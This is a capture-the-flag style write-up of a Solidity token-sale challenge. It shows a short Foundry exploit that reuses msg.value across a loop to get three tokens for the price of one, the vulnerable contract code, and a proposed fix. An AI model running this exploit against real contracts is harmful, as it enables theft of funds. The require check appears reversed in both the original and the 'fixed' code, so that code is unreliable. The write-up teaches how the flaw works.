# BuyMyTokens Solution
This challenge is another challenge that requires very little code to exploit. Let's look at the exploit, and dive into why it works:
```
function test_GetThisPassing_5() public {
    address hacker = address(0xBAD);
    

    vm.startPrank(hacker);
    uint256[] memory amounts = new uint256[](3);
    amounts[0] = 12;
    amounts[1] = 6;
    amounts[2] = 4;
    target.purchaseTokens{value: 1.2 ether}(amounts);
    vm.stopPrank();

    assertEq(token1.balanceOf(hacker), 12 ether);
    assertEq(token2.balanceOf(hacker), 6 ether);
    assertEq(token3.balanceOf(hacker), 4 ether);
}
```
All we need to exploit this smart contract is go through each price and divide it by the amount of ether we have available. But shouldn't the function revert if we attempt to double spend our ether?

If you look inside `purchaseTokens()` & `_checkPurchasingPower()`, you will see that we check if the `msg.value` is equal to the `price` * `amount` inside of the for loop:
```
function purchaseTokens(uint256[] memory _amounts) external payable {
    require(_amounts.length == 3, "There are 3 tokens");
    for(uint256 i; i < 3; i++) {
        MarqToken token = tokens[i];
        uint256 amount = _amounts[i];
        uint256 price = tokenPrices[token];
        // validation of price inside of a for loop with msg.value
        _checkPurchasingPower(msg.value, amount, price);
        token.mint(amount * 10**18);
        token.transfer(msg.sender, amount * 10**18);
    }
}

// this gets checked inside of the for loop with msg.value
function _checkPurchasingPower(uint256 _amountOfEtherAvailable, uint256 _amount, uint256 _price) internal {
    uint256 cost = _price * _amount;
    require(cost >= _amountOfEtherAvailable, "dont be that guy; pay for your tokens");
}
```
Because we do not keep track of how much of the `msg.value` should be allocated to the previous purchases, each iteration calculates the purchase price with "already spent" ether.
A better solution would involve a variable that keeps track of how much ether we have spent on previous purchases like so:
```
// added var
uint256 availableEther = msg.value;
for(uint256 i; i < 3; i++) {
    MarqToken token = tokens[i];
    uint256 amount = _amounts[i];
    uint256 price = tokenPrices[token];
    // fixed function call
    _checkPurchasingPower(availableEther, amount, price);
    token.mint(amount * 10**18);
    token.transfer(msg.sender, amount * 10**18);
    // keep track of spent ether
    availableEther -= price * amount;
}
```

If you ever see `msg.value` inside of a for loop, you should immediately be skeptical that the code functions properly.
